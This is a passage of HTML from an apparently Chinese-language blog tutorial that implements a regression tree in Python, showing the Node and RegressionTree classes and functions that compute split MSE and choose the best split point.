None</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2d97694924313-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2d97694924313-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2d97694924313-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2d97694924313-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2d97694924313-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2d97694924313-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2d97694924313-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2d97694924313-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2d97694924313-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">None</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2d97694924313-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">score</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">score</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2d97694924313-4\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2d97694924313-5\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2d97694924313-6\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">feature</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2d97694924313-7\"><span class=\"crayon-e\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">split</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h2>2.2 创建回归树类</h2>\n<p>初始化，存储根节点和树的高度。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2da3717264801\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass RegressionTree(object):\r\n    def __init__(self):\r\n        self.root = Node()\r\n        self.height = 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da3717264801-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da3717264801-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da3717264801-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da3717264801-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2da3717264801-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RegressionTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da3717264801-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da3717264801-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Node</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da3717264801-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">height</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p></p>\n<h2>2.3 计算分割点、MSE</h2>\n<p>根据自变量X、因变量y、X元素中被取出的行号idx，列号feature以及分割点split，计算分割后的MSE。注意这里为了减少计算量，用到了方差公式：<br>\n<img src=\"https://www.zhihu.com/equation?tex=+D%28X%29+%3D+E%7B%5BX-E%28X%29%5D%5E2%7D+%3D+E%28X%5E2%29-%5BE%28X%29%5D%5E2\" alt=\" D(X) = E{[X-E(X)]^2} = E(X^2)-[E(X)]^2\"></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2da8272300106\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _get_split_mse(self, X, y, idx, feature, split):\r\n    split_sum = [0, 0]\r\n    split_cnt = [0, 0]\r\n    split_sqr_sum = [0, 0]\r\n\r\n    for i in idx:\r\n        xi, yi = X[i][feature], y[i]\r\n        if xi &lt; split:\r\n            split_cnt[0] += 1\r\n            split_sum[0] += yi\r\n            split_sqr_sum[0] += yi ** 2\r\n        else:\r\n            split_cnt[1] += 1\r\n            split_sum[1] += yi\r\n            split_sqr_sum[1] += yi ** 2\r\n\r\n    split_avg = [split_sum[0] / split_cnt[0], split_sum[1] / split_cnt[1]]\r\n    split_mse = [split_sqr_sum[0] - split_sum[0] * split_avg[0],\r\n                    split_sqr_sum[1] - split_sum[1] * split_avg[1]]\r\n    return sum(split_mse), split, split_avg</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2da8272300106-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2da8272300106-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_get_split_mse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_cnt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_sqr_sum</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">xi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">yi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">xi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">split_cnt</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">yi</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-11\"><span class=\"crayon-e\">            </span><span class=\"crayon-v\">split_sqr_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">yi *</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">split_cnt</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">yi</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-15\"><span class=\"crayon-e\">            </span><span class=\"crayon-v\">split_sqr_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">yi *</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-16\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_cnt</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_cnt</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_mse</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">split_sqr_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2da8272300106-19\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">split_sqr_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_sum</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2da8272300106-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">split_mse</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0281 seconds] -->\r\n<p></p>\n<h2>2.4 计算最佳分割点</h2>\n<p>遍历特征某一列的所有的不重复的点，找出MSE最小的点作为最佳分割点。如果特征中没有不重复的元素则返回None。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dae580177047\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _choose_split_point(self, X, y, idx, feature):\r\n    unique = set([X[i][feature] for i in idx])\r\n    if len(unique) == 1:\r\n        return None\r\n\r\n    unique.remove(min(unique))\r\n    mse, split, split_avg = min(\r\n        (self._get_split_mse(X, y, idx, feature, split)\r\n            for split in unique), key=lambda x: x[0])\r\n    return mse, feature, split, split_avg</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dae580177047-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dae580177047-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dae580177047-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dae580177047-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dae580177047-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dae580177047-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dae580177047-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dae580177047-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dae580177047-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dae580177047-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dae580177047-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_choose_split_point</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dae580177047-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">unique</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dae580177047-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">unique</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dae580177047-4\"><span class=\"crayon-h\">        